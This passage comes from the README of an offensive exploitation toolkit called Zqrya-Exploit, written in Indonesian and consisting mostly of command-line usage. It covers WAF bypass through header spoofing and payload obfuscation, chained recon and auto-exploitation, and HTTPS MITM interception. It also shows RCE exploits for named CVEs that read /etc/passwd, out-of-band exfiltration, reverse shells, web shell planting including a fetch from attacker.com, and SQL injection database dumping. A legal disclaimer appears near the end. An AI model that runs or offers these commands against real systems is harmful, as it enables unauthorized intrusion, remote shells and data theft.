glob path (`/b?n/e?ho`), `printf`, here-string (`cat<<<`), `${PATH:0:1}` (obfuscate
`/`), env-var kosong (`ec${u}ho`), `${IFS}$9`, serta exec command ter-encode
**hex** (`xxd -r -p`) dan **base64** (`base64 -d`).

```bash
zqrya --cli https://target/?cmd=id --mode injection --waf --tamper all
zqrya --cli https://target/?cmd=id --exec "id" --tamper hpp
```

### Header bypass (`--waf`, `--waf-headers`)

Banyak WAF/CDN meng-whitelist IP internal atau memeriksa path/method tertentu.
`--waf` otomatis menyuntik header spoof IP internal ke setiap request:

```
X-Forwarded-For: 127.0.0.1   (di-rotasi antar IP internal)
X-Real-IP / X-Originating-IP / X-Remote-Addr / X-Client-IP / X-Custom-IP-Authorization
X-Forwarded-Host: localhost
```

`--waf-headers` menambah bypass yang lebih agresif (path/method override):

```
X-Original-URL: /     X-Rewrite-URL: /     X-HTTP-Method-Override: GET
```

```bash
zqrya --cli https://target/?cmd=id --mode injection --waf --waf-headers
```

Header default sudah ala browser (`sec-ch-ua`, `accept-language`, dll.). Saat
respons berupa halaman challenge Cloudflare ("Just a moment", `cf-mitigated`),
tool mencetak peringatan dan menyarankan `--cookie` + `--impersonate`.

> **Catatan jujur**: tidak ada bypass universal untuk Cloudflare/AWS yang
> dikonfigurasi ketat. Kombinasi di atas menaikkan peluang dengan meniru browser
> dan mengakali rules engine, tetapi efektivitas tetap tergantung konfigurasi
> WAF, origin (apakah double-decode), dan kebijakan challenge target.

---

## Mesin Exploit Vendored

Empat mesin `Zqrya-Exploit` sudah terpasang lokal (identitas sudah di-rebrand
dari source):

```bash
zqrya --cli https://target.com --hunter               # hunter : subdomain
zqrya --cli https://target.com --radar                # radar  : deteksi massal
zqrya --cli https://target/vuln.php?id=1 --dbstrike   # zyra-sqli : SQLi dump full
zqrya --cli https://target.com --fuzzer --wordlist wordlist.txt  # fuzzer : fuzz dir

# radar dengan filter kategori/severity/tags (ala dialog GUI)
zqrya --cli https://target.com --radar --radar-categories cves,admin
zqrya --cli https://target.com --radar --radar-categories cves --radar-severity critical
zqrya --cli https://target.com --radar --radar-tags rce --radar-exclude-tags intrusive

# kategori full nuclei-templates (butuh --update-templates / RADAR_TEMPLATES)
zqrya --cli https://target.com --radar --radar-categories http/cves,dns,ssl
zqrya --cli https://target.com --radar --radar-categories http/misconfiguration,network
```

Kategori **terdeteksi otomatis** dari struktur direktori templates (top-level dir
+ subdir `http/*`), jadi subdirektori nuclei baru pun langsung bisa dipakai tanpa
hardcode; key bundel kurasi (`cves`, `cms`, dll.) selalu tersedia.

Flag tambahan diteruskan apa adanya via `--tool-args`:

```bash
zqrya --cli https://target/vuln.php?id=1 --dbstrike --tool-args "--dump --threads 8"
zqrya --cli https://target.com --radar --tool-args "-severity critical"
zqrya --cli https://target.com --fuzzer --tool-args "-mr 'Response contains login'"
```

Output tiap mesin **di-stream live baris-per-baris** (bukan buffered sampai selesai),
baik ke terminal maupun saat di-pipe/redirect (mis. `... | tee log.txt` — flush per baris).

Kalau mesin vendored tidak ada, tool otomatis **fallback ke implementasi native**
(crt.sh + brute DNS, multi-vuln scan, UNION + blind SQLi dump, dir fuzz internal).
Di Windows binari Go dilewati dan native fallback dipakai otomatis.

---

## Recon: subdomain → crawl → scan → exploit

Pipeline: enumerasi subdomain (pasif crt.sh + opsional brute DNS) → crawling
URL/form dalam scope → scan tiap endpoint untuk **command injection + XSS + SQLi**
→ (opsional) exploit parameter yang terbukti rentan.

```bash
# recon + scan (tanpa exploit)
zqrya --cli example.com --mode recon

# recon + auto-exploit (command konfirmasi aman: id; uname -a; hostname)
zqrya --cli example.com --mode recon --auto-exploit

# lengkap: brute subdomain + atur kedalaman/halaman + encoding
zqrya --cli example.com --mode recon --auto-exploit \
    --subdomain-wordlist subdomains.txt --max-depth 4 --max-pages 300 \
    --delay 0.2 --encode none
```

- Scope crawl = domain utama + subdomain (link eksternal dilewati).
- Enumerasi pasif via [crt.sh](https://crt.sh); brute DNS pakai `--subdomain-wordlist`.

---

## Passive Proxy (`--listen`, ala xray)

Analisis traffic browser secara pasif — setel browser ke proxy lokal, browsing
target, dan tiap request yang lewat otomatis di-scan (XSS reflected, open
redirect, dll.).

```bash
# CLI: proxy pasif di 127.0.0.1:7777
zqrya --cli --listen 127.0.0.1:7777

# sama dengan mode passive (default 127.0.0.1:7777)
zqrya --cli https://target.com --mode passive

# HTTPS MITM: dekripsi traffic https via CA lokal
zqrya --cli --listen 127.0.0.1:7777 --mitm
```

Lalu setel proxy browser (mis. FoxyProxy) ke `http://127.0.0.1:7777` dan browsing
target. Di GUI, gunakan tombol **"Passive Proxy"** (akan ditanya apakah aktifkan
HTTPS MITM).

### HTTPS MITM (`--mitm`)

Untuk menginspeksi traffic `https://`, aktifkan `--mitm`. Tool membuat **CA lokal**
(`~/.zqrya/ca.crt` + `ca.key`) dan leaf certificate per-host yang ditandatangani
CA tersebut, lalu mendekripsi CONNECT supaya request/response https ikut di-scan.

```bash
pip install cryptography        # dependency opsional untuk --mitm
zqrya --cli --listen 127.0.0.1:7777 --mitm
```

Lalu **install `~/.zqrya/ca.crt` ke trust store browser/OS** agar tidak muncul
peringatan certificate. Tanpa `cryptography`, `--mitm` otomatis fallback ke tunnel
passthrough (traffic https tidak diinspeksi).

> `--listen 4444` (angka saja) tetap kompatibel sebagai listener reverse shell.
> Seperti xray, MITM hanya untuk pengujian yang sah (authorized).

---

## Custom PoC (JSON / YAML)

Engine PoC kustom ala xray `phantasm` — tulis PoC sebagai file JSON (atau YAML
bila PyYAML terpasang), jalankan via `--poc`.

```bash
zqrya --cli https://target.com --mode poc --poc ./pocs/
zqrya --cli https://target.com --poc single-poc.json
```

**PoC bawaan**: folder `zqrya_exploit/pocs/` sudah berisi **26 PoC siap pakai**
yang mencakup:

- **CMS**: WordPress, Joomla, Drupal, phpMyAdmin, wp-config backup
- **Panel admin / dashboard**: admin panel generik, Jenkins, Grafana, Kibana,
  Tomcat Manager, RabbitMQ, Elasticsearch, SonarQube, Laravel Telescope
- **Appliance VPN**: Fortinet SSL VPN, Cisco ASA, Pulse Secure
- **CVE**: Apache CVE-2021-41773 (path traversal)
- **Sensitif**: .git, .svn, .env, phpinfo, backup files, Swagger UI, actuator,
  GraphQL introspection

Jalankan tanpa `--poc` untuk langsung memakai bawaan:

```bash
zqrya --cli https://target.com --mode poc
```

Contoh `poc.json`:

```json
{
  "name": "admin-exposed",
  "severity": "low",
  "rules": [
    {
      "method": "POST",
      "path": "/admin/login",
      "headers": {"Content-Type": "application/x-www-form-urlencoded"},
      "body": "user=admin&pass=admin",
      "follow_redirects": false,
      "expression": "response.status == 200 && response.body.contains(\"dashboard\")"
    }
  ]
}
```

Rule mendukung `method`, `path`, `headers` (dict), `body`, `follow_redirects`, dan
`expression`. Ekspresi mendukung `response.status`, `response.body` (`.contains` /
`.icontains` / `.bcontains`), `response.headers.contains`, serta operator `&&` `||`
`!` `==` `!=` `<` `>` `<=` `>=`.

---

## Deteksi Kerentanan Framework

Modul setara xray advanced (`struts` / `thinkphp` / `shiro` / `fastjson`) untuk
deteksi kerentanan framework spesifik:

```bash
# Struts2: S2-045 (Content-Type OGNL) + evaluasi OGNL S2-057/S2-016
zqrya --cli https://target.com/index.action --mode struts

# ThinkPHP: RCE invokefunction + CVE-2018-20062
zqrya --cli https://target.com/index.php --mode thinkphp

# Shiro: fingerprint rememberMe (CVE-2016-4437)
zqrya --cli https://target.com/ --mode shiro

# Shiro: brute-force AES key (default + 21 key umum) via gadget URLDNS OOB
zqrya --cli https://target.com/ --mode shiro --oob-domain xyz.interactsh.com

# Fastjson: autoType via HTTP OOB lokal, atau DNS collaborator
zqrya --cli https://target.com/api --mode fastjson
zqrya --cli https://target.com/api --mode fastjson --oob-domain xyz.interactsh.com

# Log4Shell (CVE-2021-44228): butuh collaborator
zqrya --cli https://target.com/ --mode log4shell --oob-domain xyz.interactsh.com

# CVE critical: framework + appliance (lihat tabel di bawah)
zqrya --cli https://target.com/ --mode cve

# Semua sekaligus
zqrya --cli https://target.com/ --mode frameworks --oob-domain xyz.interactsh.com
```

### Critical CVE yang dideteksi (`--mode cve`)

| Kategori | CVE | Teknik deteksi (non-destruktif) |
|---|---|---|
| **RCE (echo marker)** | F5 BIG-IP CVE-2022-1388, Ivanti Connect Secure CVE-2024-21887, phpUnit CVE-2017-9841 | `echo <marker>` → marker muncul di respons |
| **Path traversal / file read** | Citrix ADC CVE-2019-19781, Apache CVE-2021-41773/CVE-2021-42013, Grafana CVE-2021-43798 | baca `/etc/passwd` / `smb.conf` → `root:` / `[global]` |
| **RCE (endpoint)** | Laravel Ignition CVE-2021-3129 (`can_execute_commands`), PaperCut CVE-2023-27350 (SetupCompleted tanpa auth) | cek endpoint + respons |
| **Fingerprint + catatan** | Telerik (CVE-2019-18935/2024-43624), Apache Solr, Zimbra, Spring4Shell (CVE-2022-22965), MOVEit (CVE-2023-34362), Exchange ProxyShell (CVE-2021-34473), Jenkins CLI (CVE-2024-23897), Apache OFBiz, ColdFusion (CVE-2023-26360), VMware vCenter (CVE-2021-21972) | deteksi produk → catatan CVE |

> Ditambah yang sudah ada: Weblogic CVE-2020-14882, Jenkins script console,
> Confluence CVE-2022-26134, GitLab fingerprint, Log4Shell CVE-2021-44228,
> Struts2, ThinkPHP, Shiro, Fastjson.

### Eksploitasi CVE RCE (agresif)

Ambil **output command nyata** dari CVE RCE yang sudah dikonfirmasi:

```bash
# Daftar CVE yang bisa di-exploit
zqrya --cli --exploit-list

# Jalankan command default (id; uname -a; hostname) via CVE
zqrya --cli https://target.com/ --exploit phpunit-cve-2017-9841
zqrya --cli https://target.com/ --exploit f5-cve-2022-1388 --rce-command "cat /etc/passwd"
zqrya --cli https://target.com/index.action --exploit struts-s2-045 --rce-command id
zqrya --cli https://target.com/index.php --exploit thinkphp --rce-command "whoami"

# Reverse shell langsung via CVE RCE (bukan parameter)
zqrya --cli https://target.com/ --exploit ivanti-cve-2024-21887 \
      --rshell bash --lhost 10.0.0.5 --lport 4444

# Auto-exploit: scan --mode cve, lalu otomatis jalankan id di tiap RCE yang ketemu
zqrya --cli https://target.com/ --mode cve --auto-exploit-cve
zqrya --cli https://target.com/ --mode frameworks --auto-exploit-cve \
      --rce-command "id; uname -a; hostname"
```

### Plugin selector (`--plugins`, ala xray)

Jalankan subset modul deteksi saja (lebih cepat & fokus):

```bash
zqrya --cli --plugins-list                     # daftar key plugin
zqrya --cli https://target.com --plugins xss,sqldet,cmd-injection
zqrya --cli https://target.com --plugins struts,thinkphp,shiro,fastjson,log4shell
```

> Deteksi bersifat **non-destruktif**: payload memakai `echo <marker>` / evaluasi
> aritmetika (`${233*233}` → `54289`) / callback OOB, bukan eksploitasi penuh.
> Untuk Fastjson mode lokal, DNS OOB perlu domain collaborator (`--oob-domain`).
> Untuk brute-force key Shiro (URLDNS gadget) juga perlu `--oob-domain` + `cryptography`;
> tanpa keduanya, `--mode shiro` hanya menjalankan fingerprint rememberMe.

---

## Blind / OOB (DNS & HTTP exfiltration)

Deteksi blind command injection tanpa output via callback out-of-band.

**Mode lokal (auto-detect)** — tool membuka listener HTTP + DNS sendiri:

```bash
# HTTP saja (tidak butuh root)
zqrya --cli http://localhost/vuln.php?cmd=id --mode oob --oob-type http

# HTTP + DNS (DNS butuh root karena bind port 53)
zqrya --cli http://localhost/vuln.php?cmd=id --mode oob --oob-type both

# atur IP/port sendiri
zqrya --cli http://localhost/vuln.php?cmd=id --mode oob \
    --oob-host 10.0.0.5 --oob-port 8080 --oob-wait 20
```

**Mode collaborator (manual)** — arahkan callback ke Burp Collaborator /
interactsh, cek marker di dashboard:

```bash
zqrya --cli http://localhost/vuln.php?cmd=id --mode oob \
    --oob-domain xyz123.interactsh.com
```

Payload OOB: **DNS** — `nslookup`, `dig`, `host`; **HTTP** — `curl`, `wget`,
`python`, `python3`.

---

## Reverse Shell & Web Shell

### Reverse shell

Luncurkan listener dulu (terminal lain):

```bash
nc -lvnp 4444
# atau
zqrya --cli --listen 4444
```

Lalu dari target:

```bash
zqrya --cli http://localhost/vuln.php?cmd=id \
    --rshell bash --lhost 192.168.1.10 --lport 4444

# tipe lain & daftar
zqrya --cli http://localhost/vuln.php --rshell python3 --lhost 10.0.0.5
zqrya --cli --rshell-list
```

Tipe: bash, nc, python, python3, perl, php, ruby, socat, awk.

### Web shell

```bash
# tulis PHP webshell inline (via base64) ke path target
zqrya --cli http://localhost/vuln.php?cmd=id \
    --webshell --webshell-path /var/www/html/x.php \
    --webshell-url http://localhost/x.php
# akses: http://localhost/x.php?cmd=id

# atau unduh shell yang sudah kamu host sendiri
zqrya --cli http://localhost/vuln.php?cmd=id \
    --fetch-shell http://attacker.com/shell.php \
    --webshell-path /var/www/html/x.php
```

---

## SQL Injection Dump

Ekstraksi penuh ala zyra-sqli dasar — jumlah kolom (ORDER BY) → databases →
tables → columns → data via UNION SELECT (MySQL/information_schema), plus query
SQL arbitrer. Fallback otomatis ke **blind boolean/time-based** (binary search
per char) bila UNION in-band gagal.

```bash
zqrya --cli http://localhost/vuln.php?id=1 --sqli-dump
zqrya --cli http://localhost/vuln.php?id=1 --sqli-query "select group_concat(table_name) from information_schema.tables"
```

---

## Laporan Hasil Scan

**CLI** — simpan hasil via `-o` (format otomatis dari ekstensi):

```bash
zqrya --cli http://localhost/ --mode all -o report.txt
zqrya --cli http://localhost/ --mode all -o report.json
zqrya --cli https://target.com --crawler -o report.html
```

- `.txt` — plain text
- `.json` — terstruktur (untuk diproses)
- `.html`/`.htm` — laporan web dengan tabel findings + log

**GUI** — klik **Save Report** setelah scan; pilih lokasi & format
(`.html` / `.txt` / `.json`).

> Jika `requests` tidak terpasang, tool otomatis fallback ke `urllib` bawaan Python.

---

## Sumber Payload

Payload digabung dari referensi publik (untuk kelengkapan bypass):

- [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [PayloadsAllTheThings — XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [HackTricks — Command Injection](https://hacktricks.wiki/en/pentesting-web/command-injection.html)
- [PortSwigger — OS command injection](https://portswigger.net/web-security/os-command-injection)
- OWASP testing guide

Kategori payload: chaining (`;` `|` `||` `&&` `&` `\n` `\r\n` `\t`),
substitusi perintah (`$()` backtick), bypass spasi (`${IFS}` `$IFS$9` `$@`
brace expansion), bypass keyword (quote/backslash/subshell insert), dan
time-based (`sleep`, `ping`).

Perbarui dengan payload terbaru dari repo PayloadsAllTheThings:

```bash
zqrya --cli --update-payloads
```

---

## Struktur Folder

```
zqrya.py                      # shim backward-compat (python zqrya.py)
setup.py / pyproject.toml     # build & bundling package
MANIFEST.in                   # daftar file yang ikut ke wheel
requirements.txt              # dependency (requests)
assets/
  demo.gif                    # animasi demo untuk README
zqrya_exploit/
  __init__.py                 # versi + entry point `main`
  __main__.py                 # python -m zqrya_exploit
  core.py                     # engine utama (scanner + exploiter + GUI + WAF bypass)
  wordlist.txt                # wordlist fuzz bawaan
  tools/
    dbstrike/                 # mesin zyra-sqli (SQLi full, Python — di-rebrand dari source)
    bin/
      zq-dbstrike.py          # launcher lintas-platform mesin zyra-sqli
      zq-dbstrike.cmd         # launcher Windows (opsional)
      zq-radar                # binary mesin radar (Linux, Git LFS ±138 MB)
      zq-fuzzer               # binary mesin fuzzer (Linux)
      zq-hunter               # binary mesin hunter (Linux)
payloads/                     # payload PayloadsAllTheThings (hasil --update-payloads)
reports/                      # laporan output
tests/                        # unit test (stdlib unittest, offline)
```

---

## Testing

Test suite (stdlib `unittest`, offline — semua berjalan di server HTTP lokal):

```bash
python3 -m unittest discover -s tests -v
```

Cakupan: helper & encoding, `Report`/`ScanLogger`, helper HTTP (requests +
fallback urllib), `FormParser`/`crawl_forms`, command injection (deteksi +
exploit + time-based), SQLi (error/boolean/time, UNION dump, blind extract),
XSS/SSTI/LFI/open redirect/CORS/CRLF, HTTP Request Smuggling (CL.TE/TE.CL/TE.TE),
dan WAF bypass encoding.

---

## Peringatan Hukum

Gunakan **hanya** pada sistem milikmu sendiri atau sistem yang sudah kamu dapat
izin tertulis untuk diuji (**authorized penetration testing**). Menguji atau
mengeksekusi perintah pada sistem pihak lain tanpa izin adalah tindakan ilegal.
Pengguna bertanggung jawab penuh atas penggunaan tool ini.

---

## Status Pengembangan

- **Banner & terminal berwarna**: banner ASCII font *bloody* dengan gradasi
  merah → kuning (tanpa kotak), log berwarna per-tingkat, ANSI VT aktif di
  Windows, warna otomatis mati saat non-TTY/`NO_COLOR`.
- **WAF bypass suite**: fingerprint WAF/CDN (25+ signature), `--waf` =
  `--encode auto` × `--tamper all` + spoof IP internal, `--waf-headers`
  (override path/method + rotasi XFF), tamper `hpp`/`whitespace`/`ifsvars`,
  `--impersonate` (curl_cffi), `--proxy`, `--cookie`, `--debug-http`,
  payload obfuscation (quote `e''c''h''o`, backslash, `${ECHO,,}`, glob
  `/b?n/e?ho`, `printf`, here-string, exec hex/base64).
- **Git LFS**: `zq-radar` (±138 MB) disimpan via LFS; `--fetch-tools` mengunduh
  otomatis (git-lfs atau LFS batch API), GUI tombol "Fetch Tools (LFS)".
- **Mesin vendored**: 3 binary Go di-recompile dengan identitas sendiri;
  `zyra-sqli` (vendor dbstrike) di-rebrand penuh dari sqlmap, launcher
  lintas-platform.
- Checklist lanjutan & catatan kerja ada di [`update.md`](update.md).

---

*Zqrya-Exploit — dibangun untuk pengujian keamanan yang etis. Jangan disalahgunakan.*

**Author**: [PiuPiuu](https://github.com/webdev11-code/shell-injection)
